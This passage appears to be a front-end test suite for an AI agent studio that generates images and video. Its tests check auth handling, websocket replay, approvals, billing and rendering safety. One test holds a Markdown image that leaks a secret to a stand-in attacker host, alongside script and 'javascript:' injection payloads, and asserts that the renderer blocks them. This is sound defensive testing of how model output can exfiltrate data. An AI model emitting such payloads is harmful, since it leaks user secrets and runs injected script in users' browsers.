import { File as NodeFile } from 'node:buffer'
import { useState } from 'react'
import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { http, HttpResponse } from 'msw'
import { server } from './mocks/server'
import { resetSharedSessionRefreshForTests } from '@/api/sessionRefresh'
import DeepAgentStudio from '@/components/director/DeepAgentStudio'
import CanvasDirectorDock from '@/components/director/CanvasDirectorDock'
import CanvasFloatingToolbar from '@/components/canvas/CanvasFloatingToolbar'
import DirectorStudioView from '@/views/DirectorStudioView'
import { DocumentEditor, Markdown, EventCard, Conversation, Approval } from '@/components/director/StudioCards'
import { Media, StudioMediaContext } from '@/components/director/StudioMedia'
import { applyStudioFrame, createStudioAPI, defaultModel, mediaURLs } from '@/components/director/studio'
import type { StudioRun, StudioDocument } from '@/components/director/studio'

const catalog = {
  models: [
    { id: 29, model: 'banana-pro', display_name: 'Nano Banana Pro (Google)', operation_codes: ['image.text_to_image'] },
    { id: 18, model: 'seedance-2.5', display_name: 'Seedance 2.5', operation_codes: ['video.generate'] },
  ],
  skills: [{ id: 1, name: 'director', description: '故事导演' }],
  planning_model: { id: 21, model: 'Qwen3.8-Max', operation_codes: [] },
}
function snapshot(overrides: Partial<StudioRun> = {}): StudioRun {
  return {
    id: 'run1',
    cursor: 7,
    status: 'complete',
    title: '第一集测试',
    events: [],
    selection: { image: 29, video: 18, mode: 'manual' },
    documents: [],
    batches: [],
    ...overrides,
  }
}
class Socket {
  static instances: Socket[] = []
  onopen?: () => void
  onmessage?: (event: { data: string }) => void
  onclose?: (event: { code: number }) => void
  close = vi.fn()
  constructor(public url: string) {
    Socket.instances.push(this)
  }
  emit(data: unknown) {
    this.onmessage?.({ data: JSON.stringify(data) })
  }
}
beforeEach(() => {
  resetSharedSessionRefreshForTests()
  Socket.instances = []
  vi.stubGlobal('WebSocket', Socket)
  HTMLDialogElement.prototype.showModal = function () {
    this.setAttribute('open', '')
  }
  HTMLDialogElement.prototype.close = function () {
    this.removeAttribute('open')
  }
  server.use(
    http.post('*/api/v1/auth/refresh', () => HttpResponse.json({ message: 'login required' }, { status: 401 })),
    http.get('*/agent-studio/', () => new HttpResponse('studio')),
    http.get('*/agent-studio/api/state', () =>
      HttpResponse.json({
        connected: true,
        workspace_id: 54,
        runs: [{ id: 'run1', title: '第一集测试', status: 'complete' }],
      }),
    ),
    http.get('*/agent-studio/api/catalog', () => HttpResponse.json(catalog)),
    http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot())),
  )
})
async function openHistory() {
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  fireEvent.click(screen.getByRole('button', { name: '新对话' }))
  fireEvent.click(screen.getByRole('button', { name: /第一集测试/ }))
  await waitFor(() => expect(Socket.instances.length).toBe(1))
}

describe('Studio transport', () => {
  it('canvas dock opens with business identity and collapse retains the draft without triggering canvas input', async () => {
    const canvasKey = vi.fn(),
      seen = vi.fn()
    server.use(
      http.get('*/agent-studio/api/state', ({ request }) => {
        seen(request.headers.get('X-Agent-Auth'), request.headers.get('X-Agent-Canvas-Id'))
        return HttpResponse.json({ connected: true, workspace_id: 54, runs: [] })
      }),
    )
    function CanvasHost() {
      const [opened, setOpened] = useState(false)
      return (
        <div onKeyDown={canvasKey}>
          <CanvasFloatingToolbar
            onAddNode={() => {}}
            onAddLocalImage={() => {}}
            panModeEnabled={false}
            onPanModeToggle={() => {}}
            dragEnabled
            onDragToggle={() => {}}
            onOpenSearch={() => {}}
            onOpenAssets={() => {}}
            onOpenHistory={() => {}}
            onOpenHelp={() => {}}
            directorOpen={opened}
            onToggleDirector={() => setOpened(!opened)}
          />
          <CanvasDirectorDock workspaceId={54} canvasId={40} opened={opened} onCollapse={() => setOpened(false)} />
        </div>
      )
    }
    render(<CanvasHost />)
    expect(seen).not.toHaveBeenCalled()
    expect(screen.getByRole('button', { name: '打开 DoDo Agent' }).closest('[data-canvas-floating-toolbar]')).toBeNull()
    fireEvent.click(screen.getByRole('button', { name: '打开 DoDo Agent' }))
    await screen.findByRole('button', { name: '发送创作要求' })
    expect(seen).toHaveBeenCalledWith('business', '40')
    const input = screen.getByRole('textbox')
    fireEvent.change(input, { target: { value: '保留草稿' } })
    fireEvent.keyDown(input, { key: 'Backspace' })
    expect(canvasKey).not.toHaveBeenCalled()
    fireEvent.click(
      within(screen.getByRole('region', { name: 'DoDo Agent' })).getByRole('button', { name: '收起 DoDo Agent' }),
    )
    fireEvent.click(screen.getByRole('button', { name: '打开 DoDo Agent' }))
    expect(screen.getByRole('textbox')).toHaveValue('保留草稿')
    expect(seen).toHaveBeenCalledTimes(1)
    expect(screen.getByRole('button', { name: '收起 DoDo Agent', expanded: true })).toHaveAttribute(
      'aria-expanded',
      'true',
    )
    fireEvent.click(screen.getByRole('button', { name: '收起 DoDo Agent', expanded: true }))
    expect(screen.queryByRole('textbox')).not.toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: '打开 DoDo Agent' }))
    expect(screen.getByRole('textbox')).toHaveValue('保留草稿')
  })

  it.each([65_000, 0])(
    'limits rapid auth reconnects but permits normal long-lived renewals (interval %d)',
    async (interval) => {
      render(<DeepAgentStudio workspaceId={54} canvasId={40} />)
      await openHistory()
      let now = Date.now()
      const clock = vi.spyOn(Date, 'now').mockImplementation(() => now)
      try {
        for (let index = 0; index < 4; index++) {
          now += interval
          act(() => Socket.instances.at(-1)!.emit({ event: 'stream_error', data: { code: 'AUTH_CHANGED' } }))
          if (interval || index < 3) {
            await waitFor(() => expect(Socket.instances).toHaveLength(index + 2))
          } else {
            await screen.findByText('登录状态持续变化，请重新检查业务登录。')
            expect(Socket.instances).toHaveLength(4)
          }
        }
      } finally {
        clock.mockRestore()
      }
    },
  )
  it('renews business login and only replays safe reads, never generation', async () => {
    let reads = 0,
      writes = 0,
      refreshes = 0
    server.use(
      http.get('*/agent-studio/api/state', () =>
        ++reads === 1 ? HttpResponse.json({}, { status: 401 }) : HttpResponse.json({ connected: true }),
      ),
      http.post('*/api/v1/auth/refresh', () => {
        refreshes++
        return HttpResponse.json({})
      }),
      http.post('*/agent-studio/api/runs', () => {
        writes++
        return HttpResponse.json({}, { status: 401 })
      }),
    )
    const api = createStudioAPI('/agent-studio', { workspaceId: 54, canvasId: 40 })
    expect(await api.request('/api/state')).toEqual({ connected: true })
    await expect(api.request('/api/runs', { message: 'generate' })).rejects.toMatchObject({ status: 401 })
    expect([reads, writes, refreshes]).toEqual([2, 1, 1])
  })
  it('revalidates with current browser cookies and reconnects at the saved cursor after old handshake expires', async () => {
    render(<DeepAgentStudio workspaceId={54} canvasId={40} />)
    await openHistory()
    let reads = 0
    server.use(
      http.get('*/agent-studio/api/runs/run1', () => {
        reads++
        return HttpResponse.json(snapshot({ cursor: 12 }))
      }),
    )
    const old = Socket.instances[0]
    act(() => old.emit({ event: 'stream_error', data: { code: 'AUTH_CHANGED' } }))
    await waitFor(() => expect(Socket.instances).toHaveLength(2))
    expect(old.close).toHaveBeenCalled()
    expect(old.onclose).toBeNull()
    expect(reads).toBe(1)
    expect(new URL(Socket.instances[1].url).searchParams.get('after')).toBe('12')
  })
  it('stops on real logout, clears stale results and allows explicit recheck to restore the read stream', async () => {
    render(<DeepAgentStudio workspaceId={54} canvasId={40} />)
    await openHistory()
    let valid = false
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        valid ? HttpResponse.json(snapshot()) : HttpResponse.json({ detail: '业务登录已失效' }, { status: 401 }),
      ),
    )
    act(() => Socket.instances[0].onclose?.({ code: 1008 }))
    await screen.findByText('业务登录已失效')
    expect(Socket.instances).toHaveLength(1)
    expect(screen.getByRole('button', { name: '发送创作要求' })).toBeDisabled()
    valid = true
    fireEvent.click(screen.getByRole('button', { name: 'DoDo Agent 设置' }))
    fireEvent.click(screen.getByRole('button', { name: '重新检查业务登录' }))
    await waitFor(() => expect(Socket.instances).toHaveLength(2))
  })
  it('forwards business binding with cookies on reads, writes, uploads and websocket without tokens', async () => {
    const seen: Request[] = []
    server.use(
      http.get('*/agent-studio/api/state', ({ request }) => {
        seen.push(request)
        return HttpResponse.json({ connected: true })
      }),
      http.post('*/agent-studio/api/runs', ({ request }) => {
        seen.push(request)
        return HttpResponse.json({ id: 'new' })
      }),
      http.post('*/agent-studio/api/attachments', ({ request }) => {
        seen.push(request)
        return HttpResponse.json({ id: 'file' })
      }),
    )
    const api = createStudioAPI('/agent-studio', { workspaceId: 54, canvasId: 40 })
    await api.request('/api/state')
    await api.request('/api/runs', { message: 'test' })
    await api.upload(new File(['text'], 'script.txt'))
    expect(seen).toHaveLength(3)
    for (const request of seen) {
      expect(request.credentials).toBe('same-origin')
      expect(request.headers.get('X-Agent-Auth')).toBe('business')
      expect(request.headers.get('X-Agent-Workspace-Id')).toBe('54')
      expect(request.headers.get('X-Agent-Canvas-Id')).toBe('40')
      expect(request.headers.has('Authorization')).toBe(false)
    }
    const url = new URL(api.socketURL('run1', 7))
    expect(Object.fromEntries(url.searchParams)).toEqual({
      after: '7',
      auth: 'business',
      workspace_id: '54',
      canvas_id: '40',
    })
    expect(() => createStudioAPI('/agent-studio', { workspaceId: 54, canvasId: 0 })).toThrow()
  })
  it('embedded canvas uses business session without calling OAuth connect', async () => {
    const connect = vi.fn()
    server.use(
      http.post('*/agent-studio/api/connect', () => {
        connect()
        return HttpResponse.json({ url: 'https://oauth.example' })
      }),
    )
    render(<DeepAgentStudio workspaceId={54} canvasId={40} />)
    await screen.findByRole('button', { name: '发送创作要求' })
    fireEvent.click(screen.getByRole('button', { name: 'DoDo Agent 设置' }))
    expect(screen.queryByText('重新授权')).not.toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: '重新检查业务登录' }))
    await waitFor(() => expect(screen.getByRole('button', { name: '重新检查业务登录' })).not.toBeDisabled())
    expect(connect).not.toHaveBeenCalled()
  })
  it('expired business login never falls back to external OAuth or permits generation', async () => {
    server.use(
      http.get('*/agent-studio/api/state', () => HttpResponse.json({ detail: '请先登录业务系统' }, { status: 401 })),
    )
    render(<DeepAgentStudio workspaceId={54} canvasId={40} />)
    await screen.findByText('请先登录业务系统')
    expect(screen.getByRole('button', { name: '发送创作要求' })).toBeDisabled()
    fireEvent.click(screen.getByRole('button', { name: 'DoDo Agent 设置' }))
    expect(screen.queryByRole('button', { name: '登录并连接' })).not.toBeInTheDocument()
    expect(screen.getByRole('button', { name: '重新检查业务登录' })).toBeInTheDocument()
  })
  it('only accepts a same-origin mount and keeps cookie credentials out of socket URLs', () => {
    expect(() => createStudioAPI('https://other.test')).toThrow()
    expect(() => createStudioAPI('//other.test')).toThrow()
    const url = new URL(createStudioAPI().socketURL('a/b', 12))
    expect(url.pathname).toBe('/agent-studio/api/runs/a%2Fb/ws')
    expect(url.search).toBe('?after=12')
    expect(defaultModel(catalog, 'image')).toBe(29)
    expect(defaultModel(catalog, 'video')).toBe(18)
  })
  it('deduplicates replayed tasks and replaces billing snapshots', () => {
    let run = snapshot({ status: 'running', events: [{ id: 'task-1', kind: 'cost', text: 'running' }] })
    const event = {
      event: 'update',
      cursor: 8,
      data: {
        run_id: 'run1',
        type: 'TASK_UPDATED',
        data: { id: 'task-1', kind: 'cost', text: 'done', data: { status: 'succeeded', actual_cost: 4 } },
      },
    }
    run = applyStudioFrame(run, event)
    expect(run.events).toHaveLength(1)
    expect(run.events[0].text).toBe('done')
    expect(applyStudioFrame(run, event)).toBe(run)
    expect(applyStudioFrame(run, { ...event, cursor: 9, data: { ...event.data, run_id: 'other' } })).toBe(run)
    run = applyStudioFrame(run, {
      event: 'update',
      cursor: 10,
      data: { run_id: 'run1', type: 'ACTIVITY_SNAPSHOT', data: { settled_credits: '4.000' } },
    })
    run = applyStudioFrame(run, {
      event: 'update',
      cursor: 11,
      data: { run_id: 'run1', type: 'ACTIVITY_SNAPSHOT', data: { settled_credits: '5.000' } },
    })
    expect(run.billing?.settled_credits).toBe('5.000')
    expect(
      mediaURLs({
        assets: [{ download_url: 'javascript:alert(1)' }, { download_url: 'https://example.test/image.png' }],
      }),
    ).toEqual(['https://example.test/image.png'])
  })
  it('keeps events when RUN_STATE finishes and does not infer delivery success', () => {
    const run = snapshot({ status: 'running', events: [{ id: 'task', kind: 'cost', text: 'done' }] })
    const next = applyStudioFrame(run, {
      event: 'update',
      cursor: 8,
      data: { run_id: 'run1', type: 'RUN_STATE', data: { status: 'complete' } },
    })
    expect(next.events).toEqual(run.events)
    expect(next.status).toBe('complete')
    expect(next.canvas).toBeUndefined()
  })
})

describe('Director interactions', () => {
  it('uses the selected models and mode only after explicit send; unselected skill stays private', async () => {
    const starts: unknown[] = []
    server.use(
      http.post('*/agent-studio/api/runs', async ({ request }) => {
        expect(request.headers.get('X-Agent-Request')).toBe('1')
        starts.push(await request.json())
        return HttpResponse.json({ id: 'run1' })
      }),
    )
    render(<DeepAgentStudio />)
    await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
    expect(screen.queryByText(/内置 Skill|默认 Skill/)).not.toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: '手动确认' }))
    fireEvent.click(screen.getByRole('button', { name: /自动生成.*按你的要求/ }))
    expect(starts).toHaveLength(0)
    fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '只制作第一集' } })
    fireEvent.click(screen.getByRole('button', { name: '发送创作要求' }))
    await waitFor(() => expect(starts).toHaveLength(1))
    expect(starts[0]).toMatchObject({
      message: '只制作第一集',
      selection: { image: 29, video: 18, mode: 'auto' },
      skill: '',
      attachments: [],
    })
  })
  it('shows structured approval and sends the exact decision ID, not a new run', async () => {
    const decisions: unknown[] = []
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        HttpResponse.json(
          snapshot({
            status: 'waiting',
            decision_id: 'approval-one',
            pending: {
              tool: 'production.generate_batch',
              message: '确认生成五张图，共 75 积分',
              arguments: { batch_id: 'batch-1' },
            },
          }),
        ),
      ),
      http.post('*/agent-studio/api/runs/run1/resume', async ({ request }) => {
        decisions.push(await request.json())
        return HttpResponse.json({ ok: true })
      }),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    expect(screen.getByText('确认生成五张图，共 75 积分')).toBeInTheDocument()
    expect(decisions).toHaveLength(0)
    fireEvent.click(screen.getByRole('button', { name: '确认并继续' }))
    await waitFor(() => expect(decisions).toHaveLength(1))
    expect(decisions[0]).toEqual({
      decision_id: 'approval-one',
      decision: 'approve',
      message: '用户确认继续',
      arguments: { batch_id: 'batch-1' },
    })
  })
  it('updates Doudou from live task receipts and does not confuse UI errors with disconnection', async () => {
    server.use(http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({ status: 'running' }))))
    render(<DeepAgentStudio />)
    await openHistory()
    const socket = Socket.instances[0]
    act(() => socket.onopen?.())
    expect(await screen.findByRole('img', { name: /豆豆正在思考/ })).toBeInTheDocument()
    act(() =>
      socket.emit({
        event: 'update',
        cursor: 8,
        data: {
          run_id: 'run1',
          type: 'TASK_UPDATED',
          data: {
            id: 'image',
            kind: 'cost',
            text: '生成中',
            data: { task_id: 10, status: 'running', tool: 'model.generate_image' },
          },
        },
      }),
    )
    expect(screen.getByRole('img', { name: /豆豆正在制作素材/ })).toBeInTheDocument()
    server.use(
      http.get('*/agent-studio/api/state', () => HttpResponse.json({ error: '历史读取失败' }, { status: 500 })),
    )
    fireEvent.click(screen.getByRole('button', { name: /第一集测试/ }))
    fireEvent.click(screen.getByRole('button', { name: '刷新历史' }))
    await screen.findByText('历史读取失败')
    expect(screen.getByRole('img', { name: /豆豆正在制作素材/ })).toBeInTheDocument()
    act(() => socket.emit({ event: 'snapshot', cursor: 9, data: snapshot({ cursor: 9, status: 'waiting' }) }))
    expect(screen.getByRole('img', { name: /豆豆在等你确认/ })).toBeInTheDocument()
    act(() => socket.emit({ event: 'snapshot', cursor: 10, data: snapshot({ cursor: 10, status: 'complete' }) }))
    expect(screen.getByRole('img', { name: /豆豆已完成本轮创作/ })).toBeInTheDocument()
  })
  it('reconnect updates keep one task card and canvas callback; switching closes the socket', async () => {
    const onCanvasChange = vi.fn()
    render(<DeepAgentStudio onCanvasChange={onCanvasChange} />)
    await openHistory()
    const socket = Socket.instances[0]
    act(() => {
      const update = {
        event: 'update',
        cursor: 8,
        data: {
          run_id: 'run1',
          type: 'TASK_UPDATED',
          data: {
            id: 't1',
            kind: 'cost',
            text: '图片完成',
            data: { status: 'succeeded', tool: 'model.generate_image', actual_cost: 5 },
          },
        },
      }
      socket.emit(update)
      socket.emit(update)
      socket.emit({
        event: 'update',
        cursor: 9,
        data: {
          run_id: 'run1',
          type: 'CANVAS_UPDATED',
          data: {
            id: 'canvas-1',
            kind: 'canvas',
            text: '画布已同步',
            data: { canvas_id: 35, nodes: [{ id: 'node-1' }] },
          },
        },
      })
    })
    expect(screen.getAllByText('生成图片')).toHaveLength(1)
    expect(onCanvasChange).toHaveBeenCalledWith({ canvas_id: 35, nodes: [{ id: 'node-1' }] })
    fireEvent.click(screen.getByRole('button', { name: '新建会话' }))
    expect(socket.close).toHaveBeenCalled()
    act(() =>
      socket.emit({
        event: 'snapshot',
        cursor: 10,
        data: snapshot({ events: [{ id: 'late', kind: 'assistant', text: '旧会话迟到响应' }] }),
      }),
    )
    expect(screen.queryByText('旧会话迟到响应')).not.toBeInTheDocument()
  })
  it('blocks wrong-workspace writes before a canvas can be used', async () => {
    render(<DeepAgentStudio workspaceId={99} canvasId={35} />)
    await screen.findByText(/当前 MCP 授权空间与页面不同/)
    expect(screen.getByRole('button', { name: '发送创作要求' })).toBeDisabled()
  })
  it('explicit inference retry preserves task identity and successful results', async () => {
    const decisions: unknown[] = []
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        HttpResponse.json(
          snapshot({
            status: 'error',
            inference_failure: { task_id: 4362, retryable: true },
            events: [
              {
                id: 'good-image',
                kind: 'cost',
                text: '图片完成',
                data: { tool: 'model.generate_image', status: 'succeeded', actual_cost: 15 },
              },
            ],
          }),
        ),
      ),
      http.post('*/agent-studio/api/runs/run1/resume', async ({ request }) => {
        decisions.push(await request.json())
        return HttpResponse.json({ ok: true })
      }),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    fireEvent.click(screen.getByRole('button', { name: /重试这次推理/ }))
    await waitFor(() => expect(decisions).toEqual([{ retry_inference_task_id: 4362 }]))
    expect(screen.getByText('生成图片')).toBeInTheDocument()
  })
})

describe('Studio concurrency and content boundaries', () => {
  it('partial state frames preserve recovery metadata and stale snapshots cannot rewind progress', () => {
    const run = snapshot({ active_batch: 'batch-7', inference_failure: { task_id: 4362, retryable: true } })
    const next = applyStudioFrame(run, {
      event: 'update',
      cursor: 9,
      data: { run_id: 'run1', type: 'RUN_STATE', data: { status: 'paused', stop: true, pending: null } },
    })
    expect(next.active_batch).toBe('batch-7')
    expect(next.inference_failure?.task_id).toBe(4362)
    expect(next.status).toBe('paused')
    expect(applyStudioFrame(next, { event: 'snapshot', cursor: 8, data: snapshot({ status: 'running' }) })).toBe(next)
  })
  it('saves the editing-base revision after a concurrent document update, retaining the draft', async () => {
    const save = vi.fn(async (_doc: StudioDocument, _body: string, _key: string) => {})
    const original = { id: 'doc1', title: '分镜', kind: 'storyboard', revision: 1, body: '原始正文' }
    const view = render(<DocumentEditor document={original} busy={false} onSave={save} />)
    fireEvent.click(screen.getByRole('button', { name: '编辑文档' }))
    fireEvent.change(screen.getByRole('textbox', { name: '制作文档正文' }), { target: { value: '我的未保存改动' } })
    view.rerender(
      <DocumentEditor
        document={{ ...original, revision: 2, body: '另一位操作者的新正文' }}
        busy={false}
        onSave={save}
      />,
    )
    expect(screen.getByRole('textbox', { name: '制作文档正文' })).toHaveValue('我的未保存改动')
    expect(screen.getByRole('status')).toHaveTextContent('当前草稿仍基于版本 1')
    fireEvent.click(screen.getByRole('button', { name: '保存修订' }))
    await waitFor(() => expect(save).toHaveBeenCalledTimes(1))
    expect(save.mock.calls[0][0]).toMatchObject({ id: 'doc1', revision: 1 })
    expect(save.mock.calls[0][1]).toBe('我的未保存改动')
  })
  it('does not execute model HTML or automatically fetch model-authored Markdown images', () => {
    const view = render(
      <Markdown>
        {'![private](https://attacker.test/leak?secret=x) <script>alert(1)</script> [bad](javascript:alert(1))'}
      </Markdown>,
    )
    expect(view.container.querySelector('img,script,iframe')).toBeNull()
    expect(view.container.querySelector('a')?.getAttribute('href') || '').not.toMatch(/^javascript:/)
    expect(view.container).toHaveTextContent('private')
  })
  it('allows stopping while an earlier resume HTTP request is still outstanding', async () => {
    let release: () => void = () => {}
    const pending = new Promise<void>((resolve) => {
      release = resolve
    })
    const resumes: unknown[] = [],
      stops: unknown[] = []
    server.use(
      http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({ status: 'error' }))),
      http.post('*/agent-studio/api/runs/run1/resume', async ({ request }) => {
        resumes.push(await request.json())
        await pending
        return HttpResponse.json({ ok: true })
      }),
      http.post('*/agent-studio/api/runs/run1/stop', async ({ request }) => {
        stops.push(await request.json())
        return HttpResponse.json({ ok: true })
      }),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    fireEvent.click(screen.getByRole('button', { name: '恢复执行 / 查询已有任务' }))
    await waitFor(() => expect(resumes).toHaveLength(1))
    act(() =>
      Socket.instances[0].emit({
        event: 'update',
        cursor: 8,
        data: { run_id: 'run1', type: 'RUN_STATE', data: { status: 'running', stop: false } },
      }),
    )
    const stop = screen.getByRole('button', { name: '停止后续执行' })
    expect(stop).not.toBeDisabled()
    fireEvent.click(stop)
    await waitFor(() => expect(stops).toEqual([{}]))
    release()
  })
})

describe('Media and activity recovery', () => {
  it('uses refreshed canvas URLs and never leaves a stateless progress note spinning', () => {
    expect(
      mediaURLs(
        { assets: [{ id: 12, download_url: 'https://media.test/old.png' }] },
        { nodes: [{ asset_id: 12, url: 'https://media.test/fresh.png' }] },
      ),
    ).toEqual(['https://media.test/fresh.png'])
    render(<EventCard event={{ id: 'notice', kind: 'progress', text: '参考素材已通过审核' }} />)
    expect(screen.getByText('参考素材已通过审核')).toBeInTheDocument()
    expect(screen.queryByText('处理中')).not.toBeInTheDocument()
  })
  it('refreshes an expired asset once automatically and permits an explicit read-only refresh', async () => {
    const refresh = vi.fn(async (_id: number) => ({ id: 12, download_url: 'https://media.test/fresh.png' }))
    render(
      <StudioMediaContext.Provider value={{ refresh }}>
        <Media data={{ assets: [{ id: 12, download_url: 'https://media.test/old.png' }] }} />
      </StudioMediaContext.Provider>,
    )
    fireEvent.error(screen.getByRole('img', { name: '生成素材' }))
    await waitFor(() =>
      expect(screen.getByRole('img', { name: '生成素材' })).toHaveAttribute('src', 'https://media.test/fresh.png'),
    )
    expect(refresh).toHaveBeenCalledWith(12)
    fireEvent.error(screen.getByRole('img', { name: '生成素材' }))
    expect(refresh).toHaveBeenCalledTimes(1)
    fireEvent.click(screen.getByRole('button', { name: '刷新素材链接' }))
    await waitFor(() => expect(refresh).toHaveBeenCalledTimes(2))
  })
})

describe('Director conversation parity', () => {
  it('opens real document previews from the conversation and offers the current Markdown download', async () => {
    const doc = { id: 'board', title: '第一集分镜', kind: 'storyboard', revision: 4, body: '# 分镜正文\n真实制作资料' }
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        HttpResponse.json(
          snapshot({
            documents: [doc],
            events: [{ id: 'document-board', kind: 'document', text: '已保存', data: doc }],
          }),
        ),
      ),
    )
    render(<DeepAgentStudio />)
    await openHistory()
    fireEvent.click(screen.getByRole('button', { name: /第一集分镜.*制作文档/ }))
    expect(await screen.findByRole('heading', { name: '分镜正文' })).toBeInTheDocument()
    expect(screen.getByRole('link', { name: '下载文档' })).toHaveAttribute('download', '第一集分镜.md')
    expect(decodeURIComponent(screen.getByRole('link', { name: '下载文档' }).getAttribute('href') || '')).toContain(
      '真实制作资料',
    )
    expect(screen.getByRole('button', { name: '编辑文档' })).toBeInTheDocument()
  })
  it('closes composer popovers on Escape or outside click without clearing the draft or starting work', async () => {
    render(<DeepAgentStudio />)
    await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
    fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '尚未发送的创意' } })
    fireEvent.click(screen.getByRole('button', { name: '模型', exact: true }))
    expect(screen.getByRole('dialog', { name: '选择模型' })).not.toHaveAttribute('aria-modal', 'true')
    fireEvent.keyDown(document, { key: 'Escape' })
    expect(screen.queryByRole('dialog', { name: '选择模型' })).not.toBeInTheDocument()
    expect(screen.getByRole('textbox', { name: '创作要求' })).toHaveValue('尚未发送的创意')
    fireEvent.click(screen.getByRole('button', { name: 'Skill', exact: true }))
    expect(screen.getByRole('dialog', { name: 'Skill' })).toBeInTheDocument()
    fireEvent.pointerDown(document.body)
    expect(screen.queryByRole('dialog', { name: 'Skill' })).not.toBeInTheDocument()
    expect(Socket.instances).toHaveLength(0)
  })
  it('copies assistant prose only on request and renders no invented reasoning', async () => {
    const copy = vi.fn().mockResolvedValue(undefined)
    Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: copy } })
    render(<EventCard event={{ id: 'answer', kind: 'assistant', text: '已保留全部成功素材。' }} />)
    expect(copy).not.toHaveBeenCalled()
    fireEvent.click(screen.getByRole('button', { name: '复制消息' }))
    await screen.findByRole('button', { name: '已复制' })
    expect(copy).toHaveBeenCalledWith('已保留全部成功素材。')
    expect(screen.queryByText('思考过程')).not.toBeInTheDocument()
  })
  it.each([
    ['complete', 'succeeded', false, false],
    ['paused', 'failed', false, true],
    ['running', 'running', false, true],
    ['paused', 'running', true, false],
  ] as const)(
    'keeps %s/%s batch visibility truthful and the total after task details',
    async (status, nodeStatus, cancelled, expanded) => {
      server.use(
        http.get('*/agent-studio/api/runs/run1', () =>
          HttpResponse.json(
            snapshot({
              status,
              active_batch: 'batch1',
              billing: { settled_credits: '12.000', by_kind: { text: 12, image: 0, video: 0 } },
              batches: [
                {
                  id: 'batch1',
                  revision: 1,
                  cancelled,
                  nodes: { node1: { id: 'node1', title: '首个镜头', status: nodeStatus } },
                },
              ],
            }),
          ),
        ),
      )
      render(<DeepAgentStudio />)
      await openHistory()
      const batch = screen.getByText(/制作批次/).closest('details')!
      expect(batch.open).toBe(expanded)
      const total = screen.getByText('本次共消耗 12.000 积分')
      expect(batch.compareDocumentPosition(total) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
    },
  )
  it('renders actual historical decision receipts without inventing missing questions or misclassifying resume', () => {
    render(
      <Conversation
        onDocument={() => {}}
        events={[
          { id: 'reply', kind: 'user', text: '使用原剧本对白', data: { decision: 'reply', tool: 'ask_user' } },
          { id: 'approve', kind: 'user', text: '确认这三个镜头', data: { decision: 'approve' } },
          { id: 'reject', kind: 'user', text: '这次取消', data: { decision: 'reject' } },
          { id: 'resume', kind: 'user', text: '继续查询已有任务', data: { decision: 'resume' } },
        ]}
      />,
    )
    expect(screen.getByText('已回答')).toBeInTheDocument()
    expect(screen.getByText('已确认制作')).toBeInTheDocument()
    expect(screen.getByText('已拒绝制作')).toBeInTheDocument()
    expect(screen.getByText('使用原剧本对白')).toBeInTheDocument()
    expect(screen.queryByRole('fieldset')).not.toBeInTheDocument()
    const resumed = screen.getByText('继续查询已有任务').closest('article')
    expect(resumed?.className).toContain('userMessage')
    expect(resumed?.textContent).not.toContain('已回答')
  })
  it('collapses and restores the standalone director without discarding the draft or open conversation', async () => {
    render(<DirectorStudioView />)
    await openHistory()
    fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '保留这一段草稿' } })
    fireEvent.click(screen.getByRole('button', { name: '上下文用量', exact: true }))
    fireEvent.click(screen.getByRole('button', { name: '收起 DoDo Agent' }))
    expect(screen.queryByRole('dialog', { name: '上下文用量' })).not.toBeInTheDocument()
    expect(screen.queryByRole('textbox', { name: '创作要求' })).not.toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: '打开 DoDo Agent' }))
    expect(screen.getByRole('textbox', { name: '创作要求' })).toHaveValue('保留这一段草稿')
    expect(screen.getByRole('button', { name: '第一集测试' })).toBeInTheDocument()
    expect(Socket.instances).toHaveLength(1)
  })
  it('groups adjacent tool receipts while keeping generated media and messages visible', () => {
    render(
      <Conversation
        onDocument={() => {}}
        events={[
          { id: 'a', kind: 'tool', text: '读取模型参数', data: { status: 'succeeded' } },
          { id: 'b', kind: 'tool', text: '加载制作工具', data: { status: 'succeeded' } },
          { id: 'c', kind: 'assistant', text: '素材准备完成。' },
          {
            id: 'image',
            kind: 'tool',
            text: '生成图片',
            data: {
              status: 'succeeded',
              assets: [{ id: 12, download_url: 'https://media.test/result.png' }],
            },
          },
        ]}
      />,
    )
    expect(screen.getByText('已执行 2 个工具')).toBeInTheDocument()
    expect(screen.getByText('素材准备完成。')).toBeVisible()
    expect(screen.getByRole('img', { name: '生成素材' })).toBeVisible()
  })
  it('shows unavailable context honestly and uses only reported input usage without inventing a percentage', async () => {
    render(<DeepAgentStudio />)
    await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
    fireEvent.click(screen.getByRole('button', { name: '上下文用量', exact: true }))
    expect(screen.getByText('上下文用量未提供')).toBeInTheDocument()
    expect(screen.getByText('模型上下文总容量：未提供')).toBeInTheDocument()
    expect(screen.getByText('自动压缩：状态未提供')).toBeInTheDocument()
    fireEvent.keyDown(document, { key: 'Escape' })
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        HttpResponse.json(
          snapshot({
            events: [
              {
                id: 'usage',
                kind: 'cost',
                text: '思考与编剧',
                data: {
                  tool: 'model.generate_text',
                  status: 'succeeded',
